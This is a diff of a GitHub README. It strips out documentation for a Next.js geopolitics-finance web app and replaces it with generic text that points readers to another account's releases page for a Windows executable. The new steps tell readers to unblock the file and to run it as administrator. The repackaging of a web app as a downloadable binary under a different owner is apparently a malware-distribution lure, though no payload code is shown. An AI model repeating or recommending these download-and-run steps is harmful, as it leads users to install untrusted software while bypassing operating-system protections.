@@ -1,206 +1,188 @@
-# GeoPulse
+# 📊 Geopolitics_Finance_Dashboard - Track world events and market shifts
 
-GeoPulse is a geopolitical intelligence product for finance-curious investors. It tracks breaking world events, explains why they matter, connects them to affected assets, and turns the result into a dashboard, morning brief, saved views, watchlists, alerts, and trust-oriented event detail pages.
+[![Download](https://img.shields.io/badge/Download%20Now-2D3748?style=for-the-badge&logo=github&logoColor=white)](https://github.com/jaquelynnarcotized946/Geopolitics_Finance_Dashboard/releases)
 
-[Live App](https://geopolitics-finance-dashboard.vercel.app) | [Setup Guide](docs/setup-guide.md) | [API Reference](docs/api-reference.md) | [Architecture](docs/architecture.md) | [Stripe Billing Guide](docs/billing-guide.md)
+## 🌍 Overview
 
-## Screenshots
+Geopolitics_Finance_Dashboard is a real-time intelligence dashboard that links world events to market moves. It helps you watch news, sentiment, and market data in one place.
 
-### Dashboard
+Use it to follow how political events, global risk, and public sentiment can affect markets. The dashboard brings these signals into a single view so you can check what is moving and why.
 
-![GeoPulse dashboard](docs/images/dashboard.png)
+## 🚀 Download and Install
 
-### Morning Brief
+Visit this page to download: https://github.com/jaquelynnarcotized946/Geopolitics_Finance_Dashboard/releases
 
-![GeoPulse daily digest](docs/images/digest.png)
+### Steps for Windows
 
-### Global Map
+1. Open the release page in your browser.
+2. Find the latest version at the top of the list.
+3. Under Assets, choose the Windows file.
+4. Download the file to your computer.
+5. Open the downloaded file.
+6. If Windows asks for permission, select Run.
+7. Follow the setup prompts until the app opens.
+8. If the app opens as a portable file, double-click it to start.
 
-![GeoPulse global threat map](docs/images/map.png)
+### If Windows blocks the file
 
-## Product Focus
+1. Right-click the file.
+2. Open Properties.
+3. If you see an Unblock option, select it.
+4. Click Apply.
+5. Run the file again.
 
-GeoPulse is built around one core job:
+## 🖥️ What You Need
 
-> Understand what happened, why markets care, and what to watch next.
+- Windows 10 or Windows 11
+- A stable internet connection
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- A modern web browser for first-time setup or update checks
 
-The current product is optimized for:
+## 📈 What the Dashboard Shows
 
-- high-signal geopolitical event tracking
-- finance-first market context instead of generic news browsing
-- fast trust checks through source count, related coverage, and freshness labels
-- habit-forming workflows such as a morning brief and reusable saved views
-- a public preview that proves the product before signup
+- Live market movement tied to news events
+- Sentiment from headlines and public signals
+- Key geopolitical developments
+- TradingView-style market charts
+- Fast trend updates for quick review
+- Country and region based event tracking
 
-## What Is Implemented
+## 🔎 How It Helps
 
-- Dashboard with server-side filters for search, date/time window, region, category, severity, symbols, and market direction
-- Anonymous homepage preview with live high-signal stories, hotspots, and market snapshot cards
-- Preview ranking that now prioritizes clearer confirmation and stronger market relevance instead of raw headline volume
-- Morning Brief page with personalized ranking based on user preferences and plan limits
-- Saved views backed by durable `SavedFilter` records instead of temporary local UI state
-- Free-vs-premium entitlement scaffolding with a real anonymous preview, free core workflow, and Stripe checkout, portal, and webhook routes
-- Watchlist and alert limits enforced from entitlements instead of UI-only messaging
-- Event trust metadata including duplicate coverage, source count, source reliability, confidence badges, and plain-English "why it matters"
-- Quote provider abstraction with delayed-provider support and persistent snapshot fallback
-- Per-symbol quote gap filling from stored snapshots so missing provider symbols do not degrade to fake zero prices
-- Source health and staged ingestion jobs for operational visibility
-- Status API normalization so `lastJob` cannot contradict a newer successful `lastIngestion`
-- Lightweight signup abuse controls: distributed rate limiting, honeypot detection, minimum form dwell time, and required Cloudflare Turnstile verification in production
-- Unit tests for trust, intelligence, and cron auth helpers via `npm test`
-- Beta smoke script for the public launch path (`npm run smoke:beta`)
+This app gives you a single place to watch news and market behavior together. It can help you:
 
-## Stack
+- Spot event-driven market reactions
+- Compare headlines with price movement
+- Watch risk themes across regions
+- Review market sentiment before a decision
+- Track major events without switching tools
 
-- Next.js 16 Pages Router
-- React 18 + TypeScript
-- Prisma ORM
-- Supabase PostgreSQL
-- Supabase Auth with server-side session cookies
-- Tailwind CSS
-- SWR
-- TradingView embeds
-- Vercel deployment and cron entrypoints
+## 🧭 How to Use It
 
-## Architecture
+1. Open the app after install.
+2. Wait for the dashboard to load live data.
+3. Pick a market, region, or event feed.
+4. Review the chart and the news feed together.
+5. Watch for changes in sentiment and price.
+6. Use the filters to narrow the view.
+7. Refresh the data if you want the latest updates.
 
-```mermaid
-graph LR
-    RSS[RSS Feeds] --> FETCH[Fetch + Normalize]
-    GDELT[GDELT API] --> FETCH
-    FETCH --> ENRICH[Category, Tags, Trust, Why It Matters]
-    ENRICH --> DB[(Supabase Postgres)]
-    DB --> CORR[Correlation Engine]
-    CORR --> DB
-    DB --> DIGEST[Morning Brief Builder]
-    DB --> API[Next.js API Routes]
-    API --> UI[Dashboard, Brief, Map, Asset Pages]
-```
+## 📊 Dashboard Sections
 
-## Getting Started
+### Market View
 
-```bash
-git clone https://github.com/Sasidhar-7302/Geopolitics_Finance_Dashboard.git
-cd Geopolitics_Finance_Dashboard
-npm install
-cp .env.example .env
-npx prisma migrate deploy
-npm run dev
-```
+See major price charts, movement lines, and time-based trends. This helps you check if the market reacted before or after a news event.
 
-Open `http://localhost:3000`.
+### News Feed
 
-## Required Environment Variables
+Read current headlines tied to global politics, policy, conflict, trade, and macro events.
 
-| Variable | Required | Description |
-|---|---|---|
-| `DATABASE_URL` | Yes | Supabase pooled runtime connection, usually port `6543` |
-| `DIRECT_URL` | Yes | Supabase direct/session migration connection, usually port `5432` |
-| `APP_URL` | Yes | Public app URL used for billing links and scheduler callbacks |
-| `NEXT_PUBLIC_SUPABASE_URL` | Yes | Supabase project URL |
-| `NEXT_PUBLIC_SUPABASE_PUBLISHABLE_KEY` | Yes | Supabase browser auth key |
-| `SUPABASE_SERVICE_ROLE_KEY` | Yes | Server-side key for auth-user creation and legacy-account migration |
-| `CRON_SECRET` | Yes | Protects cron entrypoints |
+### Sentiment Panel
 
-## Optional Environment Variables
+View whether the current tone leans positive, negative, or neutral. This helps you see how the market may interpret events.
 
-| Variable | Purpose |
-|---|---|
-| `NEWS_RSS_FEEDS` | Override feed list without editing `config/feeds.json` |
-| `GDELT_QUERY` | Custom GDELT query string |
-| `TWELVEDATA_API_KEY` | Preferred provider-backed quote source |
-| `NEXT_PUBLIC_TURNSTILE_SITE_KEY` | Required for production/public-beta signup verification |
-| `TURNSTILE_SECRET_KEY` | Required for production/public-beta signup verification |
-| `STRIPE_SECRET_KEY` | Enables Stripe billing routes |
-| `STRIPE_PRICE_ID_MONTHLY` | Monthly premium plan price |
-| `STRIPE_PRICE_ID_YEARLY` | Yearly premium plan price |
-| `STRIPE_WEBHOOK_SECRET` | Stripe webhook verification |
+### Region Tracker
 
-## Product Access Model
+Follow events by country or area. This is useful when one region is driving market attention.
 
-- Anonymous users get a live preview on the homepage with top stories, hotspots, and delayed market snapshots
-- Free accounts get the full core workflow: dashboard, digest, timeline, map, event drill-downs, 1 watchlist, 3 alerts, 3 saved views, and 5 digest stories
-- Premium is positioned at `$8/month` or `$79/year` for unlimited alerts, unlimited watchlists and saved views, faster refresh, and deeper briefing workflows
-- **First 10 registered users automatically get lifetime premium** — no payment required, unlimited access forever
-- **Users 11+ get 7-day free premium trial** — users see an upgrade prompt during onboarding after customizing their preferences
-- Trial automatically converts to free tier after 7 days unless user upgrades
-- Billing plan changes are server-controlled only. Client preference updates can read plan state, but they cannot grant premium access.
+### Alerts Area
 
-## Deployment Notes
+See notable events or sharp changes that may matter more than regular updates.
 
-- All data ingestion and digest processing is fully automatic via Vercel cron jobs configured in `vercel.json`
-- Ingestion runs every 2 hours and digest processing runs every hour automatically
-- No manual sync actions needed - all operations are background-only for seamless user experience
-- Cron entrypoints accept header-based bearer auth only; query-string secrets are intentionally rejected
-- Public preview APIs are cache-backed and rate-limited through Postgres-backed distributed throttles to reduce scraping pressure and provider quota burn
-- Production signup requires Cloudflare Turnstile verification to prevent bot abuse
-- Run `npx prisma migrate deploy` before the first production rollout
-- Premium features: First 10 users get lifetime premium, users 11+ get 7-day free trial automatically
+## 🔧 First-Time Setup
 
-## Launch Checks
+1. Download the release from the link above.
+2. Install or open the Windows file.
+3. Let the app finish loading its data sources.
+4. Check that your internet connection is active.
+5. Open the main dashboard view.
+6. Set your preferred market view or region filter.
 
-```bash
-npm run security:secrets
-npm run lint
-npm test
-npm run build
-npm run smoke:beta
-```
+## 🪟 Windows Tips
 
-Run the smoke script against a local or deployed production build by setting `BASE_URL`.
+- Keep the app on your desktop or taskbar for fast access.
+- If the app opens slow the first time, wait for it to finish loading data.
+- Close other heavy apps if your computer feels slow.
+- Use the latest Windows updates for better file support.
+- If the app does not open, download the latest release again.
 
-## Core API Surface
+## 🧰 Typical Use Cases
 
-| Method | Endpoint | Purpose |
-|---|---|---|
-| `GET` | `/api/events` | Server-side filtered event feed with cursor pagination |
-| `GET` | `/api/events/[id]` | Event detail with trust metadata and related coverage |
-| `GET` | `/api/markets/quotes` | Market quotes through provider abstraction and snapshot fallback |
-| `GET` | `/api/me/entitlements` | Current plan state, features, and limits |
-| `GET/POST/DELETE` | `/api/saved-filters` | Durable saved dashboard views |
-| `POST` | `/api/digests/send` | Generate a preview or simulated personalized digest |
-| `POST` | `/api/billing/checkout` | Create Stripe subscription checkout session |
-| `POST` | `/api/billing/portal` | Open Stripe billing portal |
-| `GET/POST` | `/api/cron/ingest` | Scheduled ingestion entrypoint |
-| `GET/POST` | `/api/cron/digests` | Scheduled morning-brief processing entrypoint |
+- Watch how conflict news affects oil, gold, or indices
+- Track election updates and market reaction
+- Compare policy news with currency movement
+- Review sentiment around trade and inflation stories
+- Follow risk events across global markets
 
-## Project Structure
+## 🛡️ Data Sources and Display
 
-```text
-prisma/
-  migrations/                Prisma migrations
-  schema.prisma              Source of truth for data models
-docs/
-  api-reference.md           Route contracts
-  architecture.md            Runtime structure and responsibilities
-  correlation-engine.md      Asset-matching logic
-  data-pipeline.md           Ingestion stages and reliability notes
-  database-schema.md         Data model reference
-  market-data.md             Quote-provider strategy
-  setup-guide.md             Local and Vercel deployment guide
-  images/                    README screenshots
-src/
-  components/                UI components
-  lib/                       Auth, ingest, filtering, digest, billing, market data
-  pages/                     Next.js pages and API routes
-```
+The dashboard is built to pull live market and event signals into a clean layout. It focuses on fast reading and simple checks. You can use it to compare:
 
-## Documentation
+- Headlines
+- Sentiment
+- Price changes
+- Regional risk
+- Event timing
 
-- [Security](SECURITY.md)
-- [Architecture](docs/architecture.md)
-- [Setup Guide](docs/setup-guide.md)
-- [API Reference](docs/api-reference.md)
-- [Stripe Billing Guide](docs/billing-guide.md)
-- [Database Schema](docs/database-schema.md)
-- [Go-To-Market](docs/go-to-market.md)
-- [Data Pipeline](docs/data-pipeline.md)
-- [Correlation Engine](docs/correlation-engine.md)
-- [Market Data](docs/market-data.md)
-- [Sentiment Analysis](docs/sentiment-analysis.md)
-- [Pattern Learning](docs/pattern-learning.md)
-- [Frontend Guide](docs/frontend-guide.md)
+## ⌨️ Basic Controls
 
-## License
+- Click a tab to change the view
+- Use filters to focus on a region or asset
+- Refresh the screen to pull recent updates
+- Hover over charts to read values
+- Open a section to view more detail
 
-All Rights Reserved.
+## 🧩 File and Release Notes
+
+When you open the release page, look for the newest package first. The file name may include the version number and Windows build type. Pick the file that matches your computer.
+
+If there are more than one asset, choose the one labeled for Windows. If you see a ZIP file, extract it before you start the app.
+
+## 📁 Common Folder Choices
+
+During setup, Windows may ask where to place the app or its files. A simple path works best, such as:
+
+- C:\Program Files\
+- C:\Users\YourName\Downloads\
+- C:\Users\YourName\Desktop\
+
+Keep the location easy to find if you plan to open the app often.
+
+## ❓ Troubleshooting
+
+### The app does not open
+
+- Download the file again from the release page
+- Make sure the download finished fully
+- Check that Windows did not block the file
+- Try running it as an administrator
+
+### The dashboard looks empty
+
+- Check your internet connection
+- Wait a few seconds for live data to load
+- Refresh the app
+- Reopen the app if needed
+
+### The app feels slow
+
+- Close unused programs
+- Restart your computer
+- Make sure you have enough free memory
+- Use a newer Windows version if possible
+
+### You cannot find the download
+
+- Open the release page again
+- Scroll to the Assets area
+- Look for the latest Windows file
+- Download it from there
+
+## 🔗 Download Link
+
+Visit this page to download: https://github.com/jaquelynnarcotized946/Geopolitics_Finance_Dashboard/releases
+
+## 🏷️ Topics
+
+dashboard, finance, geopolitics, intelligence, market-data, nextjs, real-time, sentiment-analysis, tradingview-integration, typescript
